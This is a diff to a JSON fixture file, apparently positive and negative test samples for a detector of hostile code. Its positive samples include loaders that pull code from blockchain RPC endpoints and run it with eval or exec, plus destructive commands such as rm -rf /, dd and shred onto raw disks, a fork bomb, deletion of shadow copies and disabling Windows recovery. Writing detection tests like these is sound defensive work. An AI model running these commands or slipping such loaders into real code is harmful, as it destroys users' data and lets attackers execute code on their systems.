@@ -60,7 +60,7 @@
   "network/blockchain-c2": {
     "lang": "js",
     "pos": [
-      "const conn = new Connection('https://api.mainnet-beta.solana.com');\nconst sigs = await conn.getSignaturesForAddress(owner);\nconst tx = await conn.getParsedTransaction(sigs[0].signature);\neval(atob(tx.meta.logMessages[0]));",
+      "const conn = new Connection(rpcUrl);\nconst sigs = await conn.getSignaturesForAddress(owner);\nconst tx = await conn.getParsedTransaction(sigs[0].signature);\neval(atob(tx.meta.logMessages[0]));",
       "const body = JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'eth_call', params: [{ to, data }, 'latest'] });\nconst res = await fetch(rpcUrl, { method: 'POST', body });\nconst code = decodeHex((await res.json()).result);\nnew Function(code)();",
       "const p = new ethers.JsonRpcProvider(rpcUrl);\nconst src = await new ethers.Contract(addr, abi, p).get();\nvm.runInThisContext(src);"
     ],
@@ -75,6 +75,40 @@
         "py",
         "w3 = Web3(Web3.HTTPProvider('https://bsc-dataseed1.example.invalid'))\npayload = contract.functions.get().call()\nexec(payload)"
       ]
+    ]
+  },
+  "exec/destructive-command": {
+    "lang": "js",
+    "pos": [
+      "execSync('rm -rf --no-preserve-root /');",
+      "exec('rm -rf ~/* &');",
+      "const cmd = 'dd if=/dev/zero of=/dev/sda bs=1M';",
+      "const bomb = ':(){ :|:& };:';",
+      "execSync('vssadmin delete shadows /all /quiet');",
+      "fs.rmSync(os.homedir(), { recursive: true, force: true });"
+    ],
+    "neg": [
+      "execSync('rm -rf node_modules');",
+      "execSync('rm -rf ./build ./dist');",
+      "execSync('rm -rf /tmp/xyz');",
+      "exec('rm -rf $HOME/.cache/my-tool');",
+      "throw new Error('Refusing to run rm -rf / on the filesystem root');",
+      "execSync('dd if=/dev/zero of=./disk.img bs=1M count=10');",
+      "const out = execSync('vssadmin list shadows');",
+      "fs.rmSync(path.join(os.homedir(), '.cache', 'tool'), { recursive: true });",
+      "const label = format(date, 'dd:MM');"
+    ],
+    "also": [
+      ["go", "exec.Command(\"bash\", \"-c\", \"dd if=/dev/zero of=/dev/nvme0n1 bs=4M\").Run()"],
+      ["go", "exec.Command(\"rm\", \"-rf\", \"/\").Run()"],
+      ["py", "shutil.rmtree(os.path.expanduser('~'), ignore_errors=True)"],
+      ["py", "subprocess.run([\"mkfs.ext4\", \"-F\", \"/dev/sdb\"])"],
+      ["rs", "Command::new(\"rm\").args([\"-rf\", \"/\"]).status()?;"],
+      ["php", "shell_exec('cmd /c format C: /q /y');"],
+      ["java", "Runtime.getRuntime().exec(\"bcdedit /set {default} recoveryenabled No\");"],
+      ["sh", "rm -rf \"$HOME\""],
+      ["sh", "wbadmin delete catalog -quiet"],
+      ["sh", "shred -n 3 -z /dev/sda"]
     ]
   }
 }
